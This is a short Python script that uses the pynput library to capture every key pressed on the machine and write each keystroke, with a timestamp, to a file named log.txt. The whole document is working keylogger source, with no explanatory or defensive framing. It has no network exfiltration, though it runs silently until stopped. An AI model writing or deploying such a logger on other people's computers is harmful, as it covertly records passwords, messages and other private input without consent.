from pynput import keyboard
import logging

file_log = 'log.txt'
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
